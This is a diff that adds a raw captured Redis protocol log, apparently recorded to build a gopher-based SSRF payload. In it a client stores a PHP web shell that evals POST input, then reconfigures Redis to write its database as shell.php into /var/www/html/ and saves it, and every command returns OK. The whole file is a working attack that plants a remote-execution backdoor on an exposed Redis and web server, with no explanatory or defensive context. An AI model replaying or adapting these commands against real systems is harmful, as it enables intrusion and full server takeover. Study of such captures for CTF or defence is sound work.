@@ -1,0 +1,47 @@
+> 2018/08/17 20:53:31.735827  length=58 from=0 to=57
+*3\r
+$3\r
+set\r
+$1\r
+1\r
+$31\r
+<?php @eval($_POST[gopher]);?>
+\r
+< 2018/08/17 20:53:31.736214  length=5 from=0 to=4
++OK\r
+> 2018/08/17 20:53:31.740278  length=55 from=0 to=54
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$3\r
+dir\r
+$14\r
+/var/www/html/\r
+< 2018/08/17 20:53:31.740505  length=5 from=0 to=4
++OK\r
+> 2018/08/17 20:53:31.745824  length=57 from=0 to=56
+*4\r
+$6\r
+config\r
+$3\r
+set\r
+$10\r
+dbfilename\r
+$9\r
+shell.php\r
+< 2018/08/17 20:53:31.746138  length=5 from=0 to=4
++OK\r
+> 2018/08/17 20:53:31.750332  length=14 from=0 to=13
+*1\r
+$4\r
+save\r
+< 2018/08/17 20:53:31.752903  length=5 from=0 to=4
++OK\r
+> 2018/08/17 20:53:31.757924  length=14 from=0 to=13
+*1\r
+$4\r
+quit\r
+< 2018/08/17 20:53:31.758220  length=5 from=0 to=4
++OK\r
